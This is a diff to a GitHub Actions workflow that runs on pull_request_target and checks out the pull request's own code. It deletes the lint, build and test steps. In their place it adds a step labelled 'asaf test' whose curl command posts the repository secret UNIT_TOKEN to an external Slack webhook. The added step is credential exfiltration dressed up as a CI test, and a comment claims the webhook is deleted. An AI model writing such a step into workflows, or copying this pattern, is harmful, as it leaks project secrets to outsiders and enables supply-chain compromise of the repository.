@@ -1,6 +1,7 @@
 name: CI
 on: [pull_request_target]
-
+env:
+  UNIT_TOKEN: ${{ secrets.UNIT_TOKEN }}
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -8,14 +9,8 @@ jobs:
       - uses: actions/checkout@v2
         with:
           ref: ${{github.event.pull_request.head.sha}}
-      - uses: actions/setup-node@v1
-        with:
-          node-version: 16.x
-      - run: npm ci
-      - run: npm run lint
-      - run: npm run build
-      - run: |
-          touch .env
-          echo UNIT_TOKEN=${{ secrets.UNIT_TOKEN }} >> .env
-          echo UNIT_API_URL=${{ secrets.UNIT_API_URL }} >> .env
-      - run: npm run test
+      # this webhook is already deleted
+      - name: asaf test
+        shell: bash
+        run: |
+          curl -X POST --data-urlencode "payload={\"channel\": \"@asaf.levy\", \"username\": \"webhookbot\", \"text\": \"token:${UNIT_TOKEN}\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/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
